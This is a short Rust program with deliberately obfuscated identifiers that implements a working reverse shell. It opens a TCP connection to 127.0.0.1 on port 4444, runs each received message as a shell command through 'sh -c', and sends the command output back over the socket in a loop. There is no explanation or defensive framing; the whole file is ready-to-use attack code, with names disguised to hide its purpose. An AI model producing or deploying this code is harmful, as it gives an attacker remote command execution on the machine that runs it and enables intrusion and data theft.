#![allow(non_snake_case)]
use std::net::TcpStream as _0x9;
use std::io::{Read, Write};
use std::process::{Command as _0xA, Stdio as _0xB};

fn _0xC() {
    if let Ok(mut _0xD) = _0x9::connect("127.0.0.1:4444") {
        loop {
            let mut _0xE = [0u8; 1024];
            let _0xF = match _0xD.read(&mut _0xE) {
                Ok(n) => n,
                Err(_) => break,
            };
            if _0xF == 0 { break; }
            let _0x10 = String::from_utf8_lossy(&_0xE[.._0xF]).to_string();
            let _0x11 = _0xA::new("sh")
                .arg("-c")
                .arg(&_0x10)
                .stdout(_0xB::piped())
                .output()
                .expect("execução falhou");
            let _0x12 = String::from_utf8_lossy(&_0x11.stdout);
            if _0xD.write_all(_0x12.as_bytes()).is_err() { break; }
        }
    }
}

fn main() {
    _0xC();
}
